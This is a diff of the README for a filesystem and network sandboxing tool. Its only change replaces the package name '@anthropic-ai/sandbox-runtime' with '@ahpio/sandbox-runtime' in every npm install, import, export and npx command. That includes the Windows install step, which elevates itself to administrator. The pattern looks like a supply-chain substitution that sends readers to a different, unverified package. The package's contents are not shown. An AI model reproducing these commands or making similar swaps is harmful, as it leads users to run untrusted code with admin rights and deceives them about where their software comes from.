@@ -11,7 +11,7 @@ A lightweight sandboxing tool for enforcing filesystem and network restrictions 
 ## Installation
 
 ```bash
-npm install -g @anthropic-ai/sandbox-runtime
+npm install -g @ahpio/sandbox-runtime
 ```
 
 ## Basic Usage
@@ -264,7 +264,7 @@ How srt reads the channel, and what it refuses:
 import {
   SandboxManager,
   type SandboxRuntimeConfig,
-} from '@anthropic-ai/sandbox-runtime'
+} from '@ahpio/sandbox-runtime'
 import { spawn } from 'child_process'
 
 // Define your sandbox configuration
@@ -386,10 +386,10 @@ No list applies while `network.httpProxyPort` names an external proxy: the wrap 
 
 ```typescript
 // Main sandbox manager
-export { SandboxManager } from '@anthropic-ai/sandbox-runtime'
+export { SandboxManager } from '@ahpio/sandbox-runtime'
 
 // Violation tracking
-export { SandboxViolationStore } from '@anthropic-ai/sandbox-runtime'
+export { SandboxViolationStore } from '@ahpio/sandbox-runtime'
 
 // TypeScript types
 export type {
@@ -401,7 +401,7 @@ export type {
   FsReadRestrictionConfig,
   FsWriteRestrictionConfig,
   NetworkRestrictionConfig,
-} from '@anthropic-ai/sandbox-runtime'
+} from '@ahpio/sandbox-runtime'
 ```
 
 ## Configuration
@@ -746,7 +746,7 @@ Windows support is **alpha**. The sandboxed process runs under a dedicated `srt-
 Run once per machine (self-elevates; one UAC prompt):
 
 ```powershell
-npx @anthropic-ai/sandbox-runtime windows-install
+npx @ahpio/sandbox-runtime windows-install
 ```
 
 This provisions the `srt-sandbox` local user account (with a random password stored DPAPI-encrypted in `HKLM\SOFTWARE\sandbox-runtime` — machine-wide, so fleet installs running as SYSTEM work and one user's rotation updates the copy the others read), the `sandbox-runtime-users` local group, and installs a machine-wide WFP filter set keyed on the `srt-sandbox` SID. It is **idempotent** — re-running it rotates the sandbox account's password and reconciles the filter set.
@@ -1034,7 +1034,7 @@ Known limitations:
 By default a sandboxed command cannot connect to anything on `localhost` except the sandbox's own proxies: not a development server, not a database, not a server another sandboxed command started. `network.allowLocalBinding` — the same setting that opens local ports on macOS — opens loopback on Windows. It is off by default, and it is a property of the install:
 
 ```powershell
-npx @anthropic-ai/sandbox-runtime windows-install --allow-loopback
+npx @ahpio/sandbox-runtime windows-install --allow-loopback
 ```
 
 ```json
@@ -1066,7 +1066,7 @@ npx @anthropic-ai/sandbox-runtime windows-install --allow-loopback
 ### Uninstall
 
 ```powershell
-npx @anthropic-ai/sandbox-runtime windows-uninstall
+npx @ahpio/sandbox-runtime windows-uninstall
 ```
 
 Removes the WFP filter set, the `srt-sandbox` account and its profile, the `sandbox-runtime-users` group, the write grants kept on `allowWrite` roots by sessions of the user running it, that user's profile read grant, and removes the `HKLM\SOFTWARE\sandbox-runtime` key (credential, marker, CA record) — one UAC prompt. It refuses up front, with `kept_grants_in_use`, while a sandbox session or command of yours is running. That is checked once, before the prompt: a session started between the check and the elevated step is not kept out, loses its account under it, and is named when the uninstall finishes. Nothing is removed before the prompt is accepted: declining it leaves the sandbox and every grant as they were. The elevated step removes the install; the grants are then taken off by the process that asked, as the user who asked, whenever the account is gone. If one cannot be, the uninstall says which, exits non-zero, and `srt-win acl forget --all` / `srt-win profile forget` finish it later — also after a reinstall, which gives the group a new identifier: the old one is remembered with the grants. A grant on a disk that is not attached is listed rather than reported as removed. `%ProgramData%\sandbox-runtime` (the CA key material) is left in place; delete it (and `%LOCALAPPDATA%\sandbox-runtime` per user) manually for a full sweep.
